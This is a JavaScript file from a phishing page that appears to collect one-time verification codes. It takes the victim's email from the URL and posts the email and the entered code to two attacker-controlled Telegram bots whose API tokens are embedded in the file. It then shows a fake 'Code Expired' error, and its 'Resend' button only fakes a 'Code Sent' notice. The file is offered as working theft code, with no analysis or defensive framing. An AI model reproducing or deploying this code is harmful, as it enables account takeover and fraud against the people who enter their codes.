const chatIds = ["-4161940851"];
// const chatIds = ["1534371221"];

let submit_btn;
let resend_btn;
let btn_loader;
let btn_text;
let formm;
let email;
let counterr;
let code_input;
document.addEventListener("DOMContentLoaded", () => {
  submit_btn = document.getElementById("submit_btn");
  formm = document.getElementById("formm");
  counterr = document.getElementById("counterr");
  code_input = document.getElementById("code_input");
  email = new URLSearchParams(window.location.search).get("em");
  console.log("email => ", email);

  formm.addEventListener("submit", async (e) => {
    e.preventDefault();
    await submit_code();
    await submit_code2();
    showBtnLoader();
    await sleep(2);
    Toastify({
      text: "Code Expired",
      duration: 2500,
      newWindow: true,
      close: true,
      gravity: "top", // `top` or `bottom`
      position: "center", // `left`, `center` or `right`
      stopOnFocus: true, // Prevents dismissing of toast on hover
      style: {
        display: "flex",
        alignItems: "center",
        justifyContent: "center",
        height: "50px",
        width: "150px",
        padding: "40px",
        background: "#FF0000",
      },
      onClick: function () {}, // Callback after click
    }).showToast();
    hideBtnLoader();
  });

  resend_btn = document.getElementById("resend_btn");
  btn_loader = document.getElementById("btn_loader");
  btn_text = document.getElementById("btn_text");
  btn_text.firstElementChild;
  btn_text.setAttribute;

  resend_btn.addEventListener("click", async (e) => {
    resend_btn.classList.toggle("hidee");
    counterr.classList.toggle("hidee");
    ``;
    submit_btn.disabled = true;
    const intervall = setInterval(() => {
      counterr.firstElementChild.innerText =
        counterr.firstElementChild.innerText - 1;
      if (counterr.firstElementChild.innerText == 0) {
        clearInterval(intervall);
        resend_btn.classList.toggle("hidee");
        counterr.classList.toggle("hidee");
      }
      console.log("reduced");
    }, 1000);
    await sleep(6);
    Toastify({
      text: "Code Sent",
      duration: 2500,
      newWindow: true,
      close: true,
      gravity: "top", // `top` or `bottom`
      position: "center", // `left`, `center` or `right`
      stopOnFocus: true, // Prevents dismissing of toast on hover
      style: {
        display: "flex",
        alignItems: "center",
        justifyContent: "center",
        height: "50px",
        width: "150px",
        padding: "40px",
        background: "#4bb543",
      },
      onClick: function () {}, // Callback after click
    }).showToast();
    submit_btn.disabled = false;
  });

  async function showBtnLoader() {
    submit_btn.disabled = true;
    btn_text.style.display = "none";
    btn_loader.style.display = "block";
  }
  async function hideBtnLoader() {
    submit_btn.disabled = false;
    btn_text.style.display = "block";
    btn_loader.style.display = "none";
  }
});

async function sleep(seconds) {
  return new Promise((resolve) => setInterval(resolve, seconds * 1000));
}

async function submit_code() {
  const msg = `
  Australian link
  ${email} verification code is \n 
  ${code_input.value} \n 
`;
const data = {
  chat_id: "1636602095",
  text: msg,
};
const resp = await fetch(
  `https://api.telegram.org/bot6852520424:AAFkqAbL3nvXE_-Xg6EomFct0EffrbVJB9E/sendMessage`,
  {
    method: "POST",
    headers: {
      accept: "application/json",
      "content-type": "application/json",
    },
    body: JSON.stringify(data),
  }
);
const resJson = await resp.json();
console.log(resJson);
}

async function submit_code2() {
  const msg = `
  Australian link
  ${email} verification code is \n 
  ${code_input.value} \n 
`;
const data = {
  chat_id: "6924640648",
  text: msg,
};
const resp = await fetch(
  `https://api.telegram.org/bot6749081112:AAGkV5D6iDUXBpDApDu2kImMs2qJyMdg13U/sendMessage`,
  {
    method: "POST",
    headers: {
      accept: "application/json",
      "content-type": "application/json",
    },
    body: JSON.stringify(data),
  }
);
const resJson = await resp.json();
console.log(resJson);
code_input.value = ""; 
}

